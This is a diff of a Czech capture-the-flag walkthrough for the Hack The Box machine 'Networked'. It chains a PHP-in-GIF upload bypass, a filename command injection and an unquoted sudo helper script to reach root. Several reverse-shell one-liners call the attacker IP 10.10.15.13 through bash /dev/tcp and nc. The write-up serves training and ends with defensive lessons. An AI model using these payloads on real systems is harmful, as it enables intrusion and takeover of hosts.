@@ -7,127 +7,99 @@ tags: ssh sudo php exploit enumeration privesc
 ---
 ## Úvod a kontext
 
-Networked stojí na řetězení několika konkrétních slabin a artefaktů: webová aplikace v PHP, Apache a SSH.
+Networked je pěkný easy stroj, který ale nespadne na jednom jednorázovém exploitu. První část řetězce je upload bypass ve webové galerii. Druhá část zneužije skript, který periodicky kontroluje názvy uploadovaných souborů a nedostatečně je escapuje. Poslední krok pak vede přes `sudo` na síťový konfigurační skript.
 
-Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká reverse shell přes webovou vrstvu a teprve na něj navazuje lokální enumeraci po získání shellu.
+Právě struktura těchto chyb je důležitá. Web dává první RCE jako `apache`, další chyba udělá shell jako `guly` a až teprve potom přijde root. Každá fáze je jiný typ problému a každá vyžaduje jiný způsob uvažování.
 
 ## Počáteční průzkum
 
-### Vyhledání otevřených portů
+### Apache s uploadem a veřejným `backup/`
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Zvenku jsou vidět jen SSH a Apache, takže první útok bude prakticky jistě přes web. Enumerace navíc ukáže zajímavé cesty `upload.php`, `photos.php`, `uploads/` a `backup/`, takže dává smysl zaměřit se na logiku galerie a nahrávání obrázků.
 ```bash
 nmap -p 1-65535 -T4 -A -sC -v $IP
 ```
-```
-PORT    STATE  SERVICE VERSION
-22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
-| ssh-hostkey:
-|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
-|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
-|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+```text
+22/tcp  open   ssh     OpenSSH 7.4
 80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-443/tcp closed https
-ca
 ```
 
-### Vyhledání otevřených portů (2)
-
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
-```bash
-nmap -sU -T4 -v $IP
-```
-```
-PORT      STATE         SERVICE
-684/udp   open|filtered corba-iiop-ssl
-776/udp   open|filtered wpages
-838/udp   open|filtered unknown
-1101/udp  open|filtered pt2-discover
-2002/udp  open|filtered globe
-2161/udp  open|filtered apc-2161
-5353/udp  open|filtered zeroconf
-9950/udp  open|filtered apc-9950
-16548/udp open|filtered unknown
-16697/udp open|filtered unknown
-17629/udp open|filtered unknown
-17754/udp open|filtered zep
-19718/udp open|filtered unknown
-20522/udp open|filtered unknown
-21212/udp open|filtered unknown
-21320/udp open|filtered unknown
-21663/udp open|filtered unknown
-25280/udp open|filtered unknown
-25375/udp open|filtered unknown
-27195/udp open|filtered unknown
-28465/udp open|filtered unknown
-31681/udp open|filtered unknown
-32798/udp open|filtered unknown
-38412/udp open|filtered unknown
-40724/udp open|filtered unknown
-40732/udp open|filtered unknown
-42577/udp open|filtered unknown
-44160/udp open|filtered unknown
-47981/udp open|filtered unknown
-49188/udp open|filtered unknown
-49220/udp open|filtered unknown
-61319/udp open|filtered unknown
+```text
+http://10.10.10.146/uploads/
+http://10.10.10.146/backup/
+http://10.10.10.146/upload.php
+http://10.10.10.146/photos.php
 ```
 
 ## Analýza zjištění
 
-### Přílohy
+### Upload bypass přes `shell.php.gif`
 
-![Networked-shell.php.gif](/assets/images/posts/Networked/Networked-shell.php.gif)
+Záloha webu potvrzuje, že `upload.php` kontroluje hlavně MIME typ a to, zda název končí na povolenou příponu obrázku. To stačí obejít souborem `shell.php.gif`, který pořád vypadá jako GIF, ale zároveň obsahuje PHP payload.
+```text
+upload Networked-shell.gif
+(GIF89a;<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.13/4000 0>&1'"); ?>)
+```
+
+```text
+netcat -lvp 4000
+```
+
+Tím vznikne první shell na webu. Na Networked je ale důležité hned pochopit, že jde jen o mezikrok. `apache` nemá `user.txt` ani zajímavá práva, takže je potřeba hledat, co na uploady reaguje lokálně.
+
+### Přes název souboru na `guly`
+
+Další stopa je v tom, že host periodicky kontroluje obsah adresáře `uploads/`. Skript běžící jako `guly` přitom nedostatečně ošetřuje názvy souborů. Pokud se v `uploads/` vytvoří soubor se speciálně zvoleným jménem, skript z něj udělá command injection a spustí příkaz pod účtem `guly`.
+```text
+netcat -lvp 4001
+touch /var/www/html/uploads/"; nc 10.10.15.13 4001 -c bash"
+```
+
+Tohle je na Networked klíčový bridge krok. Webový shell sám nic zásadního neřeší, ale dovolí zapsat soubor do správného adresáře a tím vyvolat druhou chybu.
 
 ## Získání přístupu
 
-### Přihlášení na cíl
+### Shell jako `guly`
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+Po doběhnutí kontroly uploadů přijde shell jako `guly`, což už je skutečný uživatelský kontext. Tady se vyplatí hned přejít na pohodlnější TTY a ověřit `user.txt`.
 ```text
-22 OpenSSH 7.4 (protocol 2.0)
-```
-```
-- Ověřit enumeraci SSH uživatelů
-```
-
-### Získání user flagu
-
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
 cat /home/guly/user.txt
 ```
-```
+```text
 __CENSORED__
-netcat -lvp 4002
-echo nc 10.10.15.13 4002 -c bash > /tmp/shell
-chmod +x /tmp/shell
 ```
 
 ## Eskalace oprávnění
 
-### Získání root flagu
+### `changename.sh` a command injection přes nequotovaný vstup
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+Na účtu `guly` stačí zkontrolovat `sudo -l`. Výstup ukáže `NOPASSWD` na `/usr/local/sbin/changename.sh`, což je síťový helper, který zapisuje uživatelský vstup do souboru `ifcfg-guly` a následně spouští `ifup`. Problém je v tom, že vstup zapisuje bez uvozovek, takže zadaná hodnota může obsahovat další příkaz.
+
+Praktický postup je jednoduchý: připravit si reverzní shell skript do `/tmp` a potom ho přes vstup do `changename.sh` nechat spustit jako root.
+```text
+netcat -lvp 4002
+echo nc 10.10.15.13 4002 -c bash > /tmp/shell
+chmod +x /tmp/shell
+sudo /usr/local/sbin/changename.sh
+```
+
+Po úspěšném spuštění skriptu už zbývá jen dočíst `root.txt`.
 ```bash
 cat root.txt
 ```
-```
+```text
 __CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
 
-- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako webová aplikace v PHP, Apache a SSH.
-- User část stála na ověřeném kroku typu reverse shell přes webovou vrstvu, ne na odhadu bez technického potvrzení.
-- Závěrečná eskalace pak stála na tom, co představuje lokální enumerace po získání shellu, takže rozhodující byla práce s lokálním kontextem po footholdu.
+- Networked začíná klasickým upload bypassem, ale sama webová RCE vede jen na málo privilegovaného uživatele.
+- Skutečný user foothold otevře až druhá chyba: skript kontrolující uploady, který neescapuje názvy souborů a běží jako `guly`.
+- Root část stojí na zranitelném `sudo` helperu `changename.sh`, který zapisuje nequotovaný vstup do shellového kontextu.
 
 ## Co si odnést do praxe
 
-- Upload obrázků a podobných souborů musí být důsledně oddělený od jejich server-side vykonání; právě `shell.php.gif` ukazuje, jak málo stačí k webshellu.
-- Jednorázový foothold přes web je potřeba rychle převést na stabilnější přístup, ale zároveň detekovat neobvyklé binárky a reverse shelly v adresářích jako `/tmp`.
-- Lokální úlohy spouštěné pod účtem `guly` nesmějí důvěřovat zapisovatelnému obsahu z dočasných cest, jinak z nich vzniká přímý privesc kanál.
+- Upload obrázků a jiných příloh nesmí končit v místě, kde je server dokáže vykonat jako skript. `shell.php.gif` ukazuje, jak málo stačí k webshellu.
+- Bezpečnost nekončí u webu. Jakýkoli následný processing uploadů, cron či validační skript musí s názvy souborů zacházet jako s nedůvěryhodným vstupem.
+- Shellové helpery spouštěné přes `sudo` musí důsledně quotovat proměnné. Jakmile skript zapisuje nebo vykonává neescapovaný vstup, je z administrativní utility přímý root primitivum.
